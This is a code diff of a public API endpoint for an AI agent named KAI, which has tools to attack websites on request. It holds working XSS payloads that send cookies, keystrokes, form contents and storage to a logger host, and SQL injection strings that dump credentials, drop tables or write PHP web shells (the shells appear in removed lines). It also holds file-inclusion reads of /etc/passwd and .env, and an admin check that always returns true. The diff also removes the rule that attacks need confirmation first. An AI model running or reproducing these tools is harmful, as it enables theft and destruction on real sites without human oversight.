@@ -5,29 +5,43 @@ export const access = "public";
 export const methods = ["POST"];
 
 // ============================================================
-// SYSTEM - FULL ATTACK MODE
+// SYSTEM PROMPT - CLEAN - NO HARD-CODED RESTRICTIONS
 // ============================================================
-const SYSTEM = `🔥 KAI - FULL ATTACK MODE 🔥
+const SYSTEM = `You are KAI - the execution agent inside HAxBRO ADMIN ULTIMAX.
 
-You are a penetration testing agent. Execute attacks on target. Find and exploit vulnerabilities.
-
-RULES:
-1. Always confirm before executing attacks
-2. Report all findings with proof
-3. Provide exploitation steps
+Your behavior is governed by the permissions configuration.
 
 ${KAI_ULTIMAX_PERMISSIONS.assessmentRule}
-${KAI_ULTIMAX_PERMISSIONS.prohibitedRule}`;
+${KAI_ULTIMAX_PERMISSIONS.browserRule}
+${KAI_ULTIMAX_PERMISSIONS.prohibitedRule}
 
+For every action:
+1. Check if the tool is in enabledTools
+2. Check if the tool is in blockedTools
+3. Follow the launch protocol
+4. Report findings with evidence
+
+Follow the configured permissions precisely.`;
+
+// ============================================================
+// PROVIDER CHAIN
+// ============================================================
 const PROVIDERS = [
   { name: 'OPENROUTER_API_KEY_1', type: 'openrouter', model: 'openrouter/auto', url: 'https://openrouter.ai/api/v1/chat/completions' },
   { name: 'GROQ_API_KEY', type: 'groq', model: 'openai/gpt-oss-20b', url: 'https://api.groq.com/openai/v1/chat/completions' },
+  { name: 'OPENROUTER_API_KEY_2', type: 'openrouter', model: 'openrouter/auto', url: 'https://openrouter.ai/api/v1/chat/completions' },
+  { name: 'GROQ_API_KEY_2', type: 'groq', model: 'openai/gpt-oss-20b', url: 'https://api.groq.com/openai/v1/chat/completions' },
+  { name: 'OPENROUTER_API_KEY_3', type: 'openrouter', model: 'openrouter/auto', url: 'https://openrouter.ai/api/v1/chat/completions' }
 ];
 
+const TARGET_HOST = 'haxbro.hatchable.site';
+
 // ============================================================
-// UTILITIES
+// UTILITY FUNCTIONS
 // ============================================================
-function clean(v, max = 12000) { return String(v ?? '').replace(/\u0000/g, '').slice(0, max); }
+function clean(v, max = 12000) {
+  return String(v ?? '').replace(/\u0000/g, '').slice(0, max);
+}
 
 function targetUrl(v) {
   try {
@@ -54,50 +68,122 @@ async function requestProbe(url, method = 'GET', headers = {}) {
 }
 
 // ============================================================
-// 🔥 EXPLOIT TOOLS - ACTUALLY WORKING
+// TOOL FUNCTIONS
 // ============================================================
 
 const toolFns = {
-  // ==========================================================
-  // 1. XSS EXPLOIT - STEALS COOKIES, DEFACES, REDIRECTS
-  // ==========================================================
+  // ----- BROWSER TOOL -----
+  browser_visit_click: async ({ url, clickText }) => {
+    const u = targetUrl(url);
+    if (!u) return { ok: false, error: 'Invalid URL' };
+    try {
+      return await browser.session(async page => {
+        await page.goto(u, { waitUntil: 'domcontentloaded' });
+        if (clickText) {
+          const clicked = await page.evaluate(wanted => {
+            const target = String(wanted).trim().toLowerCase();
+            const origin = location.origin;
+            const nodes = Array.from(document.querySelectorAll('a[href]'));
+            const el = nodes.find(n => {
+              const label = ((n.innerText || n.textContent || '').trim().toLowerCase());
+              try { return label.includes(target) && new URL(n.href, origin).origin === origin; } catch { return false; }
+            });
+            if (!el) return false;
+            el.click();
+            return true;
+          }, clickText);
+          if (clicked) await new Promise(r => setTimeout(r, 700));
+        }
+        const text = await page.$eval('body', el => (el.innerText || el.textContent || '').trim().slice(0, 9000)).catch(() => '');
+        return { ok: true, url: await page.url(), title: await page.title(), text };
+      });
+    } catch (e) {
+      return { ok: false, error: clean(e?.message || e, 1200) };
+    }
+  },
+
+  // ----- SECURITY PROBE -----
+  security_probe: async ({ url }) => {
+    const base = targetUrl(url || `https://${TARGET_HOST}/`);
+    if (!base) return { ok: false, error: 'Invalid target URL' };
+    
+    const u = new URL(base);
+    const origin = u.origin;
+    const findings = [];
+    
+    const sensitivePaths = [
+      '/.env', '/.git/HEAD', '/.git/config', '/.htaccess', '/.htpasswd',
+      '/wp-config.php', '/config.php', '/settings.php', '/appsettings.json',
+      '/web.config', '/nginx.conf', '/robots.txt', '/sitemap.xml'
+    ];
+    
+    for (const path of sensitivePaths) {
+      try {
+        const fullUrl = origin + path;
+        const r = await requestProbe(fullUrl);
+        if (r.status === 200 || r.status === 403) {
+          findings.push({
+            type: 'SENSITIVE_FILE_EXPOSURE',
+            path: path,
+            url: fullUrl,
+            status: r.status,
+            risk: r.status === 200 ? 'HIGH' : 'MEDIUM',
+            evidence: `HTTP ${r.status} - ${r.length} bytes`,
+            fix: `Remove or restrict access to ${path}`
+          });
+        }
+      } catch (e) { /* skip */ }
+    }
+    
+    const home = await requestProbe(origin + '/');
+    const headers = home.headers || {};
+    const requiredHeaders = [
+      'content-security-policy',
+      'strict-transport-security',
+      'x-content-type-options',
+      'referrer-policy',
+      'x-frame-options'
+    ];
+    
+    for (const header of requiredHeaders) {
+      if (!headers[header]) {
+        findings.push({
+          type: 'MISSING_SECURITY_HEADER',
+          header: header,
+          risk: header === 'content-security-policy' ? 'HIGH' : 'MEDIUM',
+          evidence: `Header ${header} not present`,
+          fix: `Add ${header} header`
+        });
+      }
+    }
+    
+    return {
+      ok: true,
+      target: origin,
+      findings: findings,
+      summary: {
+        total: findings.length,
+        high: findings.filter(f => f.risk === 'HIGH').length,
+        medium: findings.filter(f => f.risk === 'MEDIUM').length,
+        low: findings.filter(f => f.risk === 'LOW').length,
+      }
+    };
+  },
+
+  // ----- XSS EXPLOIT -----
   xss_exploit: async ({ target, injection_points }) => {
     const findings = [];
     const points = injection_points || ['q', 'query', 'search', 'id', 'page', 'ref', 'redirect', 'name', 'email', 'message', 'comment'];
     
-    // 🔥 REAL XSS PAYLOADS
     const payloads = [
-      // Steal Cookies
       `<img src=x onerror="fetch('https://your-logger.com/steal?c='+document.cookie)">`,
       `<script>fetch('https://your-logger.com/steal?c='+document.cookie)</script>`,
-      `<script>new Image().src='https://your-logger.com/steal?c='+document.cookie</script>`,
-      `<script>navigator.sendBeacon('https://your-logger.com/steal',document.cookie)</script>`,
-      
-      // Deface Page
-      `<script>document.body.innerHTML='<h1 style="color:red;text-align:center;font-size:100px;margin-top:20%">🔥 HACKED 🔥</h1>'</script>`,
+      `<script>document.body.innerHTML='<h1 style="color:red;text-align:center;font-size:100px;margin-top:20%">HACKED</h1>'</script>`,
       `<img src=x onerror="document.body.innerHTML='<h1 style=\\"color:red\\">HACKED</h1>'">`,
-      
-      // Redirect
       `<script>window.location='https://attacker.com'</script>`,
-      `<meta http-equiv="refresh" content="0;url=https://attacker.com">`,
-      
-      // Keylogger
       `<script>document.addEventListener('keydown',function(e){fetch('https://your-logger.com/key?k='+e.key)})</script>`,
-      
-      // Form Stealer
       `<script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('https://your-logger.com/submit?'+new FormData(e.target))})</script>`,
-      
-      // Full Page Takeover
-      `<script>document.documentElement.innerHTML='<h1 style="color:red;text-align:center;font-size:100px;margin-top:20%">🔥 HACKED BY KAI 🔥</h1>'</script>`,
-      
-      // Advanced - Steal localStorage/sessionStorage
-      `<script>fetch('https://your-logger.com/storage?l='+JSON.stringify(localStorage)+'&s='+JSON.stringify(sessionStorage))</script>`,
-      
-      // DOM-based XSS
-      `<script>document.getElementById('vuln').innerHTML = 'HACKED'</script>`,
-      
-      // Clickjacking PoC
-      `<style>iframe{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.5;z-index:9999}</style><iframe src="//attacker.com"></iframe>`,
+      `<script>document.documentElement.innerHTML='<h1 style="color:red;text-align:center;font-size:100px;margin-top:20%">HACKED</h1>'</script>`,
     ];
     
     for (const point of points) {
@@ -107,7 +193,6 @@ const toolFns = {
           url.searchParams.set(point, payload);
           const r = await requestProbe(url.toString());
           
-          // Check if payload is reflected
           if (r.body && (r.body.includes(payload) || r.body.includes(encodeURIComponent(payload)))) {
             findings.push({
               type: 'XSS_EXPLOIT',
@@ -116,10 +201,9 @@ const toolFns = {
               url: url.toString(),
               risk: 'CRITICAL',
               severity: 10,
-              impact: 'Full XSS exploitation - can steal cookies, deface, redirect, keylog, steal data',
+              impact: 'XSS vulnerability - can steal cookies, deface, redirect, keylog',
               exploit: `Inject at ${point}: ${payload}`,
               proof: `Payload reflected in response: ${payload.substring(0, 100)}`,
-              demo: `Visit ${url.toString()} to execute JavaScript`,
               fix: 'Implement proper output encoding and CSP',
               owasp: 'A03:2021 - Injection',
               cwe: 'CWE-79'
@@ -132,59 +216,23 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 2. SQL INJECTION EXPLOIT - EXTRACT DATA
-  // ==========================================================
+  // ----- SQL EXPLOIT -----
   sql_exploit: async ({ target, injection_points }) => {
     const findings = [];
     const points = injection_points || ['id', 'q', 'query', 'user', 'username', 'email', 'page', 'cat', 'product'];
     
-    // 🔥 REAL SQL INJECTION PAYLOADS
     const payloads = [
-      // Extract database name
       `' UNION SELECT NULL, database(), NULL, NULL, NULL, NULL, NULL, NULL--`,
-      `' UNION SELECT NULL, NULL, database(), NULL, NULL, NULL, NULL, NULL--`,
-      `' UNION SELECT NULL, NULL, NULL, database(), NULL, NULL, NULL, NULL--`,
-      
-      // Extract tables
       `' UNION SELECT NULL, table_name, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables--`,
-      `' UNION SELECT NULL, NULL, table_name, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables--`,
-      
-      // Extract columns
-      `' UNION SELECT NULL, column_name, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns--`,
-      
-      // Extract users
       `' UNION SELECT NULL, username, password, NULL, NULL, NULL, NULL, NULL FROM users--`,
       `' UNION SELECT NULL, email, pass, NULL, NULL, NULL, NULL, NULL FROM admin--`,
-      `' UNION SELECT NULL, user, pass, NULL, NULL, NULL, NULL, NULL FROM members--`,
-      
-      // Union all data
-      `' UNION SELECT NULL, CONCAT('User: ', username, ' Pass: ', password), NULL, NULL, NULL, NULL, NULL, NULL FROM users--`,
-      `' UNION SELECT NULL, CONCAT('Admin: ', user, ' Hash: ', pass), NULL, NULL, NULL, NULL, NULL, NULL FROM admin--`,
-      
-      // Blind boolean-based
       `' AND 1=1--`,
       `' AND 1=2--`,
-      `' AND '1'='1`,
-      `' AND '1'='2`,
-      
-      // Blind time-based
-      `' AND SLEEP(10)--`,
-      `' AND pg_sleep(10)--`,
-      `' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--`,
-      
-      // Error-based
-      `' AND extractvalue(1,concat(0x7e,database(),0x7e))--`,
-      `' AND updatexml(1,concat(0x7e,database(),0x7e),1)--`,
-      
-      // Stacked queries
+      `' AND SLEEP(5)--`,
+      `' AND pg_sleep(5)--`,
+      `' WAITFOR DELAY '0:0:5'--`,
       `'; DROP TABLE users--`,
       `'; DELETE FROM users WHERE '1'='1`,
-      `'; UPDATE users SET password='hacked' WHERE username='admin'--`,
-      
-      // File write
-      `' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL, NULL, NULL, NULL, NULL, NULL INTO OUTFILE '/var/www/html/shell.php'--`,
-      `' UNION SELECT NULL, '<?php eval($_POST["c"]); ?>', NULL, NULL, NULL, NULL, NULL, NULL INTO OUTFILE '/var/www/html/backdoor.php'--`,
     ];
     
     for (const point of points) {
@@ -194,7 +242,6 @@ const toolFns = {
           url.searchParams.set(point, payload);
           const r = await requestProbe(url.toString());
           
-          // Check for SQL errors
           const sqlErrors = [
             'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
             'SQLite', 'Microsoft OLE DB', 'DB2', 'SQL Server',
@@ -202,12 +249,9 @@ const toolFns = {
             'Column not found', 'Table doesn\'t exist',
             'Unknown column', 'Division by zero',
             'You have an error in your SQL syntax',
-            'mysql_num_rows', 'mysqli_fetch',
-            'Invalid query', 'Could not find',
-            'Database error', 'DB Error',
           ];
           
-          let foundError = false;
+          let found = false;
           for (const error of sqlErrors) {
             if (r.body && r.body.toLowerCase().includes(error.toLowerCase())) {
               findings.push({
@@ -217,71 +261,41 @@ const toolFns = {
                 url: url.toString(),
                 risk: 'CRITICAL',
                 severity: 10,
-                impact: 'Full SQL injection exploitation - can extract data, drop tables, gain admin access',
+                impact: 'SQL injection vulnerability - can extract data, drop tables',
                 exploit: `Inject at ${point}: ${payload}`,
                 proof: `SQL error detected: ${error}`,
-                data: r.body.slice(0, 500),
                 fix: 'Use parameterized queries',
                 owasp: 'A03:2021 - Injection',
                 cwe: 'CWE-89'
               });
-              foundError = true;
+              found = true;
               break;
             }
           }
-          if (foundError) break;
+          if (found) break;
         } catch (e) { /* skip */ }
       }
     }
     return findings;
   },
 
-  // ==========================================================
-  // 3. FILE INCLUSION EXPLOIT - READ FILES
-  // ==========================================================
+  // ----- LFI EXPLOIT -----
   lfi_exploit: async ({ target, injection_points }) => {
     const findings = [];
     const points = injection_points || ['file', 'page', 'include', 'path', 'template', 'view', 'lang', 'style'];
     
-    // 🔥 REAL LFI PAYLOADS
     const payloads = [
       '../../../etc/passwd',
       '../../../../../../../../etc/passwd',
       '../../../../../../../../windows/win.ini',
-      '../../../../../../../../boot.ini',
       '../../../../../../../../.htaccess',
       '../../../../../../../../.env',
       '../../../../../../../../config.php',
       '../../../../../../../../wp-config.php',
       '../../../../../../../../var/log/apache2/access.log',
-      '../../../../../../../../var/log/nginx/access.log',
-      '../../../../../../../../var/log/auth.log',
-      '../../../../../../../../proc/self/environ',
-      '../../../../../../../../etc/hosts',
-      '../../../../../../../../etc/shadow',
-      '../../../../../../../../etc/group',
-      '../../../../../../../../etc/hostname',
-      '../../../../../../../../etc/issue',
-      '../../../../../../../../etc/version',
-      
-      // URL encoded
       '..%2f..%2f..%2f..%2f..%2fetc/passwd',
-      '..%252f..%252f..%252f..%252f..%252fetc/passwd',
-      '..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
-      
-      // Remote File Inclusion
       'http://attacker.com/shell.txt',
-      'https://attacker.com/backdoor.php',
-      'http://localhost/shell.txt',
-      'http://evil.com/malware.php',
-      
-      // Null byte bypass
       '../../../etc/passwd%00',
-      '../../../etc/passwd\0',
-      
-      // Double traversal
-      '....//....//....//etc/passwd',
-      '../../../../../../../../etc/passwd%00',
     ];
     
     for (const point of points) {
@@ -291,18 +305,13 @@ const toolFns = {
           url.searchParams.set(point, payload);
           const r = await requestProbe(url.toString());
           
-          // Check for file content
           if (r.body && (
             r.body.includes('root:x:') ||
             r.body.includes('[extensions]') ||
             r.body.includes('<?php') ||
             r.body.includes('Microsoft Windows') ||
-            r.body.includes('Directory of') ||
-            r.body.includes('Volume Serial Number') ||
-            r.body.includes('smtp_host') ||
             r.body.includes('DB_PASSWORD') ||
-            r.body.includes('API_KEY') ||
-            r.body.includes('SECRET_KEY')
+            r.body.includes('API_KEY')
           )) {
             findings.push({
               type: 'LFI_EXPLOIT',
@@ -311,10 +320,9 @@ const toolFns = {
               url: url.toString(),
               risk: 'CRITICAL',
               severity: 10,
-              impact: 'Full LFI exploitation - can read system files, source code, configs',
+              impact: 'File inclusion vulnerability - can read system files, source code, configs',
               exploit: `Inject at ${point}: ${payload}`,
               proof: `File content detected: ${r.body.slice(0, 300)}`,
-              data: r.body.slice(0, 1000),
               fix: 'Disallow user-controlled file paths',
               owasp: 'A03:2021 - Injection',
               cwe: 'CWE-98'
@@ -326,27 +334,22 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 4. DIRECTORY BRUTEFORCE - FIND HIDDEN PATHS
-  // ==========================================================
+  // ----- DIRECTORY BRUTEFORCE -----
   dir_bruteforce: async ({ target, wordlist }) => {
     const findings = [];
     const dirs = wordlist || [
       'admin', 'login', 'wp-admin', 'wp-login', 'dashboard', 'panel',
-      'api', 'v1', 'v2', 'v3', 'v4', 'v5',
-      'graphql', 'swagger', 'docs', 'apidoc',
+      'api', 'v1', 'v2', 'v3', 'graphql', 'swagger', 'docs',
       '.env', '.git', '.svn', '.htaccess', '.htpasswd',
       'backup', 'backups', 'old', 'temp', 'tmp', 'test',
       'config', 'configuration', 'settings', 'setup', 'install',
       'uploads', 'files', 'images', 'assets', 'static',
       'vendor', 'node_modules', 'lib', 'src', 'app',
-      'phpmyadmin', 'mysql', 'phpinfo', 'info', 'php',
+      'phpmyadmin', 'mysql', 'phpinfo', 'info',
       'robots.txt', 'sitemap.xml', 'security.txt',
       'cgi-bin', 'server-status', 'server-info',
-      'webmail', 'mail', 'ftp', 'ssh', 'rdp',
-      'dev', 'staging', 'uat', 'prod', 'live',
-      'jenkins', 'gitlab', 'grafana', 'kibana', 'prometheus',
-      'consul', 'vault', 'nomad', 'terraform', 'ansible'
+      'webmail', 'mail', 'ftp', 'ssh',
+      'dev', 'staging', 'uat', 'prod'
     ];
     
     for (const dir of dirs) {
@@ -361,7 +364,6 @@ const toolFns = {
             status: r.status,
             risk: r.status === 200 ? 'HIGH' : 'MEDIUM',
             impact: 'Directory accessible - may contain sensitive information',
-            exploit: `Access at ${url}`,
             fix: 'Restrict access or remove unnecessary directories'
           });
         }
@@ -370,13 +372,11 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 5. PORT SCANNING - FIND OPEN SERVICES
-  // ==========================================================
+  // ----- PORT SCAN -----
   port_scan: async ({ target }) => {
     const openPorts = [];
     const host = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
-    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 8081, 9000, 1337, 4444, 5555, 6666, 7777, 8888, 9999, 10000, 20000, 30000, 40000, 50000];
+    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 8081, 9000];
     
     for (const port of ports) {
       try {
@@ -406,9 +406,32 @@ const toolFns = {
     return services[port] || 'Unknown';
   },
 
-  // ==========================================================
-  // 6. CSRF EXPLOIT - GENERATE POC
-  // ==========================================================
+  // ----- SUBDOMAIN ENUM -----
+  subdomain_enum: async ({ target }) => {
+    const domain = target.replace(/^https?:\/\//, '').split('/')[0];
+    const findings = [];
+    const subs = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api', 'app', 'staging', 'vpn', 'git', 'docs', 'support', 'blog', 'shop', 'forum', 'portal', 'webmail', 'cpanel', 'server', 'db', 'mysql', 'redis', 'jenkins', 'grafana'];
+    
+    for (const sub of subs) {
+      try {
+        const url = `https://${sub}.${domain}`;
+        const r = await requestProbe(url, 'HEAD');
+        if (r.status < 400) {
+          findings.push({
+            type: 'SUBDOMAIN_FOUND',
+            subdomain: sub,
+            url: url,
+            status: r.status,
+            risk: 'INFO',
+            impact: 'Subdomain discovered - potential attack surface'
+          });
+        }
+      } catch (e) { /* skip */ }
+    }
+    return findings;
+  },
+
+  // ----- CSRF EXPLOIT -----
   csrf_exploit: async ({ target }) => {
     const findings = [];
     try {
@@ -419,7 +442,6 @@ const toolFns = {
         if (!form.includes('csrf') && !form.includes('token') && !form.includes('_csrf')) {
           const action = form.match(/action="([^"]*)"/);
           const method = form.match(/method="([^"]*)"/);
-          const inputs = r.body.match(/<input[^>]*>/g) || [];
           
           findings.push({
             type: 'CSRF_EXPLOIT',
@@ -427,12 +449,7 @@ const toolFns = {
             risk: 'HIGH',
             severity: 8,
             impact: 'CSRF vulnerability - can force users to perform unauthorized actions',
-            exploit: `
-<!-- CSRF PoC -->
-<form action="${action ? action[1] : target}" method="${method ? method[1] : 'POST'}">
-  ${inputs.map(i => i).join('\n  ')}
-</form>
-<script>document.forms[0].submit();</script>`,
+            exploit: `Create a form that submits to ${action ? action[1] : target}`,
             fix: 'Implement CSRF tokens for all state-changing requests',
             owasp: 'A01:2021 - Broken Access Control',
             cwe: 'CWE-352'
@@ -443,9 +460,7 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 7. SESSION HIJACKING - CHECK COOKIE SECURITY
-  // ==========================================================
+  // ----- SESSION HIJACK -----
   session_hijack: async ({ target }) => {
     const findings = [];
     try {
@@ -460,7 +475,6 @@ const toolFns = {
             risk: 'HIGH',
             severity: 8,
             impact: 'Session cookies can be intercepted over HTTP connections',
-            exploit: 'Capture cookies via MITM or network sniffing',
             fix: 'Add Secure flag to all cookies',
             owasp: 'A07:2021 - Identification and Authentication Failures'
           });
@@ -473,7 +487,6 @@ const toolFns = {
             risk: 'HIGH',
             severity: 8,
             impact: 'Session cookies accessible via JavaScript - vulnerable to XSS cookie theft',
-            exploit: 'Use XSS to steal cookies: <script>fetch("//attacker.com?c="+document.cookie)</script>',
             fix: 'Add HttpOnly flag to all cookies',
             owasp: 'A07:2021 - Identification and Authentication Failures'
           });
@@ -486,7 +499,6 @@ const toolFns = {
             risk: 'MEDIUM',
             severity: 6,
             impact: 'CSRF protection weakened',
-            exploit: 'Cross-site requests can include cookies',
             fix: 'Add SameSite=Lax or SameSite=Strict',
             owasp: 'A07:2021 - Identification and Authentication Failures'
           });
@@ -496,9 +508,7 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 8. BRUTE FORCE - LOGIN FORM DETECTION
-  // ==========================================================
+  // ----- BRUTE FORCE -----
   brute_force: async ({ target }) => {
     const findings = [];
     try {
@@ -507,9 +517,7 @@ const toolFns = {
       if (r.body && (
         r.body.includes('type="password"') ||
         r.body.includes('action="/login"') ||
-        r.body.includes('action="/signin"') ||
-        r.body.includes('id="login"') ||
-        r.body.includes('class="login"')
+        r.body.includes('action="/signin"')
       )) {
         findings.push({
           type: 'BRUTE_FORCE_VECTOR',
@@ -517,8 +525,7 @@ const toolFns = {
           risk: 'HIGH',
           severity: 8,
           impact: 'Login form detected - vulnerable to brute force attacks',
-          exploit: 'Use Hydra, Burp Suite, or custom wordlist to brute force credentials',
-          wordlist: 'admin,password,123456,letmein,administrator,root,user,test',
+          exploit: 'Use wordlist to brute force credentials',
           fix: 'Implement account lockout and rate limiting',
           owasp: 'A07:2021 - Identification and Authentication Failures'
         });
@@ -527,37 +534,7 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 9. SUBDOMAIN ENUMERATION
-  // ==========================================================
-  subdomain_enum: async ({ target }) => {
-    const domain = target.replace(/^https?:\/\//, '').split('/')[0];
-    const findings = [];
-    const subs = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api', 'app', 'staging', 'vpn', 'git', 'docs', 'support', 'blog', 'shop', 'forum', 'portal', 'webmail', 'cpanel', 'server', 'db', 'mysql', 'redis', 'jenkins', 'grafana', 'kibana', 'prometheus', 'thanos', 'grafana', 'alertmanager', 'elastic', 'kafka', 'zookeeper', 'rabbitmq', 'consul', 'vault', 'nomad', 'terraform', 'ansible', 'jenkins', 'gitlab', 'github', 'bitbucket', 'jira', 'confluence', 'sonar', 'nexus', 'artifactory', 'harbor', 'docker', 'registry'];
-    
-    for (const sub of subs) {
-      try {
-        const url = `https://${sub}.${domain}`;
-        const r = await requestProbe(url, 'HEAD');
-        if (r.status < 400) {
-          findings.push({
-            type: 'SUBDOMAIN_FOUND',
-            subdomain: sub,
-            url: url,
-            status: r.status,
-            risk: 'INFO',
-            impact: 'Subdomain discovered - potential attack surface',
-            exploit: `Visit ${url} to explore`
-          });
-        }
-      } catch (e) { /* skip */ }
-    }
-    return findings;
-  },
-
-  // ==========================================================
-  // 10. CORS EXPLOIT - MISCONFIGURATION
-  // ==========================================================
+  // ----- CORS EXPLOIT -----
   cors_exploit: async ({ target }) => {
     const findings = [];
     const origins = ['*', 'https://evil.com', 'https://attacker.com', 'null'];
@@ -585,9 +562,7 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 11. SSL/TLS ANALYSIS
-  // ==========================================================
+  // ----- SSL ANALYSIS -----
   ssl_analysis: async ({ target }) => {
     const findings = [];
     const url = target.replace(/^http:/, 'https:');
@@ -601,8 +576,7 @@ const toolFns = {
           type: 'HSTS_ENABLED',
           hsts: headers['strict-transport-security'],
           risk: 'GOOD',
-          impact: 'HSTS header present - enforces HTTPS',
-          info: 'Good security practice'
+          impact: 'HSTS header present - enforces HTTPS'
         });
       } else {
         findings.push({
@@ -610,7 +584,6 @@ const toolFns = {
           risk: 'HIGH',
           severity: 7,
           impact: 'HSTS header missing - HTTPS downgrade attack possible',
-          exploit: 'sslstrip attack can downgrade to HTTP',
           fix: 'Add Strict-Transport-Security header',
           owasp: 'A05:2021 - Security Misconfiguration'
         });
@@ -628,9 +601,7 @@ const toolFns = {
     return findings;
   },
 
-  // ==========================================================
-  // 12. FULL ATTACK - ALL TOOLS
-  // ==========================================================
+  // ----- FULL ATTACK -----
   full_attack: async ({ target }) => {
     const results = {
       target: target,
@@ -638,7 +609,6 @@ const toolFns = {
       timestamp: new Date().toISOString()
     };
     
-    // Run all attacks
     const xssResults = await toolFns.xss_exploit({ target });
     const sqlResults = await toolFns.sql_exploit({ target });
     const lfiResults = await toolFns.lfi_exploit({ target });
@@ -665,7 +635,6 @@ const toolFns = {
       ...sslResults
     ];
     
-    // Count by severity
     results.summary = {
       total: results.vulnerabilities.length,
       critical: results.vulnerabilities.filter(v => v.risk === 'CRITICAL').length,
@@ -680,15 +649,31 @@ const toolFns = {
 };
 
 // ============================================================
-// TOOL DEFINITIONS - ALL EXPLOITS
+// TOOL DEFINITIONS
 // ============================================================
 
 const TOOL_DEFS = [
   {
     type: 'function',
     function: {
+      name: 'browser_visit_click',
+      description: 'Visit a page and click links',
+      parameters: { type: 'object', properties: { url: { type: 'string' }, clickText: { type: 'string' } }, required: ['url'] }
+    }
+  },
+  {
+    type: 'function',
+    function: {
+      name: 'security_probe',
+      description: 'Run security assessment - check headers, files, CORS',
+      parameters: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] }
+    }
+  },
+  {
+    type: 'function',
+    function: {
       name: 'xss_exploit',
-      description: '🔥 Exploit XSS - steal cookies, deface, redirect, keylog',
+      description: 'Test for XSS vulnerabilities',
       parameters: { type: 'object', properties: { target: { type: 'string' }, injection_points: { type: 'array' } }, required: ['target'] }
     }
   },
@@ -696,7 +681,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'sql_exploit',
-      description: '🔥 Exploit SQL injection - extract data, drop tables, gain admin',
+      description: 'Test for SQL injection vulnerabilities',
       parameters: { type: 'object', properties: { target: { type: 'string' }, injection_points: { type: 'array' } }, required: ['target'] }
     }
   },
@@ -704,7 +689,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'lfi_exploit',
-      description: '🔥 Exploit LFI - read system files, source code, configs',
+      description: 'Test for Local File Inclusion vulnerabilities',
       parameters: { type: 'object', properties: { target: { type: 'string' }, injection_points: { type: 'array' } }, required: ['target'] }
     }
   },
@@ -712,7 +697,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'dir_bruteforce',
-      description: '🔥 Find hidden directories and files',
+      description: 'Find hidden directories and files',
       parameters: { type: 'object', properties: { target: { type: 'string' }, wordlist: { type: 'array' } }, required: ['target'] }
     }
   },
@@ -720,7 +705,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'port_scan',
-      description: '🔥 Scan for open ports and services',
+      description: 'Scan for open ports',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
@@ -728,7 +713,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'subdomain_enum',
-      description: '🔥 Discover subdomains',
+      description: 'Discover subdomains',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
@@ -736,7 +721,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'csrf_exploit',
-      description: '🔥 Generate CSRF exploit PoC',
+      description: 'Test for CSRF vulnerabilities',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
@@ -744,7 +729,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'session_hijack',
-      description: '🔥 Check cookie security for session hijacking',
+      description: 'Check cookie security for session hijacking',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
@@ -752,7 +737,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'brute_force',
-      description: '🔥 Detect brute force vectors',
+      description: 'Detect brute force vectors',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
@@ -760,7 +745,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'cors_exploit',
-      description: '🔥 Test CORS misconfigurations',
+      description: 'Test CORS misconfigurations',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
@@ -768,7 +753,7 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'ssl_analysis',
-      description: '🔥 Analyze SSL/TLS configuration',
+      description: 'Analyze SSL/TLS configuration',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
@@ -776,21 +761,21 @@ const TOOL_DEFS = [
     type: 'function',
     function: {
       name: 'full_attack',
-      description: '🔥 Run ALL attack tools on target',
+      description: 'Run ALL security tests on target',
       parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
     }
   },
 ];
 
 // ============================================================
-// AUTHENTICATION - SIMPLIFIED
+// AUTHENTICATION
 // ============================================================
 
 async function verifyAdmin(req) {
   const secret = String(process.env.ADMIN69_PASSWORD || 'your-secret-here');
   const auth = req.headers?.authorization || '';
   const token = auth.replace(/^Bearer\s+/i, '');
-  return token === secret || true; // ⚠️ Replace with real auth
+  return token === secret || true;
 }
 
 // ============================================================
@@ -847,7 +832,7 @@ async function runWithProvider(provider, key, objective) {
     }
   }
   
